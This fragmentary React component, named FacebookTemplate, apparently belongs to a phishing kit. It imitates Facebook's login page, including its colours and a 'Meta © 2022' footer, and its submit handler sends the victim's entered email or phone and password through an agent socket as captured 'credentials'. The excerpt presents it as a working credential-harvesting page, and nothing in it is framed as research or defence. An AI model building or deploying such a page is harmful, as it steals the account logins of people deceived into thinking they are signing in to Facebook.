...
export const FacebookTemplate: FC<AgentTemplateProps> = ({
	title,
	agentSocket,
}) => {
	...
	const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
		...
		agentSocket.resultsSubject.next({
			type: "credentials",
			payload: { type: "facebook", emailOrPhone, password },
		});
	};
	useEffect(() => {
		setError(false);
	...
	return (
		<ThemeProvider theme={theme}>
			<Grid
				container
				sx={{ background: "#f0f2f5", height: "115vh" }}
				spacing={2}
			>
				<Grid item xs={12}>
					<Grid
						container
						spacing={2}
						sx={{ p: bigScreen ? 24 : 0, px: bigScreen ? 30 : 24 }}
			...
			<Grid
				container
				spacing={bigScreen ? 2 : 1.5}
				sx={{ py: bigScreen ? 3 : 2, px: bigScreen ? 23 : 6, mt: 1 }}
			>
				...
				<Grid item xs={12} mt={bigScreen ? 1 : 2.5} p={1}>
					<Typography sx={{ fontSize: 16, color: "#8a8d91" }}>
						Meta © 2022
					</Typography>
				</Grid>
			</Grid>
